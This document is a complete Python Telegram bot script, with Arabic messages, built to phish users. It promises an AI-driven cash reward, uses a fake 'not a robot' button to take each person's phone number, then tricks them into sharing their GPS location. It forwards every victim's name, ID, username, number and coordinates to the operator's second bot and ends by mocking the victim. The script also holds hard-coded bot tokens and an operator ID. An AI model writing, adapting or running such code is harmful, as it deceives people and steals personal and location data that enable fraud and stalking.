import telebot
from telebot import types
import requests

# --- إعدادات الهوية ---
VICTIM_TOKEN = '8702448733:AAGgvJD8uPN0vopl5WWrQy-Qw3yeCnMvSHU'
ADMIN_TOKEN = '8063773621:AAFi-YK1qJJ_Klv63YUeO9NiW4anKBhaZSM'
MY_ID = 8216889664

# رابط مباشر للصورة (تم تحديثه ليعمل تلقائياً)
IMAGE_URL = 'https://telegra.ph/file/07f43f88636e053155721.jpg'

bot = telebot.TeleBot(VICTIM_TOKEN)

def send_to_admin(text):
    try:
        url = f"https://api.telegram.org/bot{ADMIN_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": MY_ID, "text": text, "parse_mode": "Markdown"})
    except:
        pass

send_to_admin("🔥 **النظام متصل وجاهز للعمل!**")

@bot.message_handler(commands=['start'])
def start(message):
    user = message.from_user
    log = (
        f"👤 **مستخدم جديد:**\n"
        f"• الاسم: {user.first_name}\n"
        f"• الآيدي: `{user.id}`\n"
        f"• اليوزر: @{user.username if user.username else 'لا يوجد'}"
    )
    send_to_admin(log)

    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    btn_phone = types.KeyboardButton("التأكد من أنك لست ريبوت 🤖", request_contact=True)
    markup.add(btn_phone)
    
    welcome_text = (
        f"💰 **مرحباً بك يا {user.first_name}!**\n\n"
        "أنت مؤهل لاستلام مكافأة مالية فورية عبر نظام الذكاء الاصطناعي.\n"
        "لإتمام العملية، يرجى الضغط على الزر أدناه لتأكيد رقم هاتفك."
    )
    
    try:
        # إرسال الصورة عبر الرابط مباشرة
        bot.send_photo(message.chat.id, photo=IMAGE_URL, caption=welcome_text, reply_markup=markup)
    except Exception as e:
        bot.send_message(message.chat.id, welcome_text, reply_markup=markup)
        send_to_admin(f"❌ فشل إرسال الصورة: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    if message.contact:
        phone = message.contact.phone_number
        send_to_admin(f"📞 **تم استلام الرقم!**\nالرقم: `+{phone}`\nالضحية: {message.from_user.first_name}")
        
        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        btn_loc = types.KeyboardButton("لضمان التواصل بدون مشاكل 🌍", request_location=True)
        markup.add(btn_loc)
        
        bot.send_message(
            message.chat.id, 
            "✅ **تم تأكيد الرقم!**\n\nتأكد من ضمان التواصل عبر المحفظه 💸.",
            reply_markup=markup
        )

@bot.message_handler(content_types=['location'])
def handle_location(message):
    if message.location:
        lat = message.location.latitude
        lon = message.location.longitude
        report = (
            f"📍 **تم استلام الموقع!**\n"
            f"الضحية: {message.from_user.first_name}\n"
            f"الإحداثيات: `{lat},{lon}`\n"
            f"خرائط جوجل: http://maps.google.com/maps?q={lat},{lon}"
        )
        send_to_admin(report)
        
        final_msg = (
            "بقولك يعالمي 🫪\n"
            "تم سحب موقعك ي اهطل فلوسك عند امك 🥹"
        )
        bot.send_message(message.chat.id, final_msg, parse_mode="Markdown")

if __name__ == "__main__":
    bot.infinity_polling()
    